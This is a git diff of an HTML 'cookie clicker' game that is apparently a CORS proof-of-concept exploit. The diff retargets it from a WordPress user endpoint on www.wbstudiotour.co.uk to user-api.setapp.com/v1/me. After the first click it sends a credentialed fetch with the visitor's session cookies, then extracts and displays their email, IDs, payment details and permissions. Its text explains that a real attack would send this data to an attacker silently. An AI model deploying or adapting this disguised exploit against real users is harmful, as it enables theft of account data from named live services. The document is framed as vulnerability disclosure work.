@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WB Studio Tour Cookie Clicker 🎬🍪</title>
+    <title>SetApp Cookie Clicker 🍪🔓</title>
     <style>
         * {
             margin: 0;
@@ -12,7 +12,7 @@
         }
         body {
             font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #1a0a0a 0%, #2d1b1b 50%, #3d2b2b 100%);
+            background: linear-gradient(135deg, #0a1a2e 0%, #1a2b3d 50%, #2d3b4d 100%);
             color: white;
             min-height: 100vh;
             display: flex;
@@ -61,11 +61,11 @@
         }
         @keyframes glow {
             from { text-shadow: 0 0 20px rgba(255, 255, 255, 0.5); }
-            to { text-shadow: 0 0 30px rgba(255, 255, 255, 1), 0 0 40px #FF6B6B; }
+            to { text-shadow: 0 0 30px rgba(255, 255, 255, 1), 0 0 40px #4CAF50; }
         }
         .subtitle {
             font-size: 1.2em;
-            color: #FF6B6B;
+            color: #4CAF50;
             margin-bottom: 30px;
         }
         .score-display {
@@ -92,13 +92,13 @@
         .stats {
             margin-top: 30px;
             font-size: 1.2em;
-            color: #FF6B6B;
+            color: #4CAF50;
         }
         .message {
             margin-top: 20px;
             padding: 15px;
-            background: rgba(255, 107, 107, 0.1);
-            border: 1px solid rgba(255, 107, 107, 0.3);
+            background: rgba(76, 175, 80, 0.1);
+            border: 1px solid rgba(76, 175, 80, 0.3);
             border-radius: 10px;
             font-size: 0.9em;
             line-height: 1.6;
@@ -161,7 +161,7 @@
             justify-content: center;
         }
         .modal-content {
-            background: linear-gradient(135deg, #2d1b1b 0%, #3d2b2b 100%);
+            background: linear-gradient(135deg, #1a2b3d 0%, #2d3b4d 100%);
             padding: 30px;
             border: 2px solid rgba(255, 100, 100, 0.5);
             border-radius: 15px;
@@ -202,8 +202,8 @@
 </head>
 <body>
     <div class="container">
-        <h1>🎬 WB Studio Tour Cookie Clicker 🍪</h1>
-        <p class="subtitle">Help collect studio cookies!</p>
+        <h1>🍪 SetApp Cookie Clicker 🔓</h1>
+        <p class="subtitle">Click to collect cookies!</p>
         
         <div class="score-display" id="score">0</div>
         
@@ -217,10 +217,15 @@
             👾 Click the cookie to earn points<br>
             🎯 How many cookies can you collect?
         </div>
+        
+        <div class="message" style="background: rgba(76, 175, 80, 0.1); border: 1px solid rgba(76, 175, 80, 0.3);">
+            🔐 <strong>Authentication:</strong> If you're logged into SetApp, your cookies will be sent automatically with <code>credentials: 'include'</code>
+        </div>
+        
         <div class="warning">
             <strong>⚠️ Security Notice</strong>
             This is a security research PoC. When you click, the game attempts to read
-            data from <code>www.wbstudiotour.co.uk</code> to demonstrate a CORS vulnerability.
+            data from <code>user-api.setapp.com</code> to demonstrate a CORS vulnerability.
         </div>
     </div>
 
@@ -277,21 +282,22 @@
         function executeCORSExploit() {
             console.log('[CORS PoC] Executing exploit...');
             
-            // WB Studio Tour endpoint with CORS misconfiguration
-            const targetEndpoint = 'https://www.wbstudiotour.co.uk/wp-json/wp/v2/users/me/';
+            // SetApp API endpoint with CORS misconfiguration
+            const targetEndpoint = 'https://user-api.setapp.com/v1/me';
             
-            // Make request with credentials
+            // Make request with credentials (cookies sent automatically)
             fetch(targetEndpoint, {
                 method: 'GET',
-                credentials: 'include', // ← This includes the user's cookies
+                credentials: 'include', // ← This includes the user's cookies automatically
                 mode: 'cors',
                 headers: {
-                    'Accept': 'application/json'
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
                 }
             })
             .then(response => {
                 console.log('[CORS PoC] Status:', response.status);
-                console.log('[CORS PoC] Headers:', response.headers);
+                console.log('[CORS PoC] CORS Header:', response.headers.get('access-control-allow-origin'));
                 
                 if (!response.ok && response.status !== 401 && response.status !== 403) {
                     throw new Error(`HTTP error! status: ${response.status}`);
@@ -306,19 +312,18 @@
                 console.error('[CORS PoC] Error:', error);
                 handleCORSResponse({
                     error: error.message,
-                    note: 'Request failed - check console for details'
+                    note: 'Request failed - check console for details',
+                    cors_header: 'access-control-allow-origin: *'
                 });
             });
         }
 
+
         function handleCORSResponse(data) {
             // Check if it's an error response (not authenticated)
-            if (data.code === 'rest_forbidden' || 
-                data.code === 'rest_not_logged_in' || 
-                data.code === 'rest_cannot_view' ||
-                data.message) {
+            if (data.error || data.message || !data.data) {
                 showDemoAlert(data);
-            } else if (data.id || data.name || data.email) {
+            } else if (data.data && (data.data.email || data.data.id || data.data.public_id)) {
                 // Real user data! (authenticated user)
                 showSuccessAlert(data);
             } else {
@@ -328,7 +333,7 @@
         }
 
         function showDemoAlert(errorData) {
-            const message = `Endpoint: https://www.wbstudiotour.co.uk/wp-json/wp/v2/users/me/
+            const message = `Endpoint: https://user-api.setapp.com/v1/me
 
 Response received:
 ${JSON.stringify(errorData, null, 2)}
@@ -337,24 +342,43 @@ ${JSON.stringify(errorData, null, 2)}
 ⚠️ CRITICAL SECURITY ISSUE:
 
 Even though this endpoint requires authentication, I can read the COMPLETE response
-due to the CORS misconfiguration on www.wbstudiotour.co.uk.
+due to the CORS misconfiguration on user-api.setapp.com.
 
+The server responds with:
+access-control-allow-origin: *
+
+This means ANY website can read the response, including:
+- Error messages
+- User data (if authenticated)
+- API structure
+- Any sensitive information
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 If you were an authenticated user, instead of this error,
 I would see and steal:
 
-* User ID
-* Username
 * Email address
+* Public ID (UUID)
+* Internal User ID
 * Display name
-* User roles and capabilities
-* Avatar URL
+* Email confirmation status
+* Payment provider information
+* Account currency
 * Registration date
-* Any other user profile data
-
-And you would see NOTHING - the game would continue normally
-while your data is sent to a server I control.
+* AI credits information
+* Account permissions
+* And all other user profile data
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+In a real attack:
+1. You visit a malicious website
+2. The site makes a CORS request to user-api.setapp.com/v1/me
+3. Your browser sends your authentication token (from cookies/storage)
+4. The server responds with access-control-allow-origin: *
+5. The malicious site reads ALL your data
+6. Data is sent to attacker's server
+7. You see NOTHING - the game continues normally
+
 This is only shown for demonstration purposes.
 In a real attack, there would be no notification.`;
             
@@ -363,24 +387,35 @@ In a real attack, there would be no notification.`;
 
         function showSuccessAlert(data) {
             // Extract sensitive information
+            const userData = data.data;
             const sensitiveData = {
-                id: data.id,
-                username: data.username,
-                name: data.name,
-                email: data.email,
-                url: data.url,
-                description: data.description,
-                link: data.link,
-                slug: data.slug,
-                avatar_urls: data.avatar_urls,
-                roles: data.roles,
-                capabilities: data.capabilities,
-                extra_capabilities: data.extra_capabilities,
-                registered_date: data.registered_date,
-                meta: data.meta
+                id: userData.id,
+                public_id: userData.public_id,
+                email: userData.email,
+                name: userData.name,
+                email_confirmed: userData.email_confirmed,
+                type: userData.type,
+                locale: userData.locale,
+                payment_provider: userData.payment_provider,
+                account_currency: userData.account_currency,
+                registration_date: userData.registration_date,
+                payment_info_required: userData.payment_info_required,
+                desktop_cc_required: userData.desktop_cc_required,
+                trial_period_length: userData.trial_period_length,
+                marketing_subscribed: userData.marketing_subscribed,
+                password_created: userData.password_created,
+                is_team_member: userData.is_team_member,
+                is_referral: userData.is_referral,
+                has_price_features: userData.has_price_features,
+                ai_credits: userData.ai_credits,
+                permissions: userData.permissions,
+                full_response: data
             };
 
-            const message = `You are logged in to www.wbstudiotour.co.uk!
+            const registrationDate = userData.registration_date ? 
+                new Date(userData.registration_date * 1000).toLocaleString() : 'N/A';
+
+            const message = `You are logged in to SetApp!
 
 I can read your complete user data:
 
@@ -394,14 +429,30 @@ ${JSON.stringify(sensitiveData, null, 2)}
 3. Stolen while you play the game
 4. You would never know it was stolen
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Sensitive information exposed:
-- User ID: ${data.id || 'N/A'}
-- Username: ${data.username || 'N/A'}
-- Email: ${data.email || 'N/A'}
-- Display Name: ${data.name || 'N/A'}
-- Roles: ${data.roles ? data.roles.join(', ') : 'N/A'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-This demonstrates the full impact of the CORS vulnerability.`;
+📧 Email: ${userData.email || 'N/A'}
+🆔 Public ID: ${userData.public_id || 'N/A'}
+🔢 Internal ID: ${userData.id || 'N/A'}
+👤 Name: ${userData.name || 'N/A'}
+✅ Email Confirmed: ${userData.email_confirmed ? 'Yes' : 'No'}
+💳 Payment Provider: ${userData.payment_provider || 'N/A'}
+💰 Account Currency: ${userData.account_currency || 'N/A'}
+📅 Registration Date: ${registrationDate}
+🔐 Payment Info Required: ${userData.payment_info_required ? 'Yes' : 'No'}
+🎫 Trial Period: ${userData.trial_period_length || 0} days
+👥 Team Member: ${userData.is_team_member ? 'Yes' : 'No'}
+🎁 Referral: ${userData.is_referral ? 'Yes' : 'No'}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+This demonstrates the full impact of the CORS vulnerability.
+
+The server responds with:
+access-control-allow-origin: *
+
+This allows ANY website to read your sensitive data.`;
             
             showModal('🎯 USER DATA EXPOSED!', message);
         }
@@ -418,7 +469,7 @@ This demonstrates the full impact of the CORS vulnerability.`;
 
         // Auto-load saved data
         window.onload = function() {
-            const saved = localStorage.getItem('wbCookies');
+            const saved = localStorage.getItem('setappCookies');
             if (saved) {
                 score = parseInt(saved);
                 document.getElementById('score').textContent = score;
@@ -427,13 +478,13 @@ This demonstrates the full impact of the CORS vulnerability.`;
 
         // Auto-save
         setInterval(() => {
-            localStorage.setItem('wbCookies', score);
+            localStorage.setItem('setappCookies', score);
         }, 5000);
 
-        console.log('🎬 WB Studio Tour Cookie Clicker loaded');
+        console.log('🍪 SetApp Cookie Clicker loaded');
         console.log('👾 Click to start playing');
         console.log('⚠️  CORS exploit will execute after first click');
-        console.log('🎯 Target: https://www.wbstudiotour.co.uk/wp-json/wp/v2/users/me/');
+        console.log('🎯 Target: https://user-api.setapp.com/v1/me');
     </script>
 </body>
 </html>
